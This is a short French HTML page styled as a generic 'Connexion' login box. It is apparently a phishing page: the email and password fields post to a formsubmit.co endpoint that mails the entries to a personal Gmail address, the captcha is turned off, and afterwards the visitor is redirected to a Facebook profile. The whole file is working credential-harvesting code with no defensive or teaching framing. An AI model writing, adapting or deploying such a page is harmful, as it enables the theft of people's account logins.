<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connexion</title>

<style>
body{
font-family:Arial,sans-serif;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
background:#eef4ff;
}

.box{
background:#fff;
padding:30px;
border-radius:15px;
width:350px;
box-shadow:0 0 15px rgba(0,0,0,.15);
}

h2{
text-align:center;
margin-bottom:20px;
}

input{
width:100%;
padding:12px;
margin:10px 0;
border:1px solid #ccc;
border-radius:8px;
box-sizing:border-box;
}

button{
width:100%;
padding:12px;
background:#1565ff;
color:#fff;
border:none;
border-radius:8px;
font-size:16px;
cursor:pointer;
}

button:hover{
background:#0d47a1;
}
</style>
</head>

<body>

<div class="box">
<h2>Connexion</h2>

<form action="https://formsubmit.co/faneltarud@gmail.com" method="POST">
<!-- Redirection vers Facebook après soumission -->
<input type="hidden" name="_next" value="https://www.facebook.com/profile.php?id=61590270815025">
<input type="hidden" name="_subject" value="Nouvelle tentative de connexion">
<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_template" value="table">

<input type="email" name="email" id="email" placeholder="Adresse e-mail" required>
<input type="password" name="password" id="password" placeholder="Mot de passe" required>
<button type="submit">Se connecter</button>
</form>

<p id="message"></p>

</div>

</body>
</html>
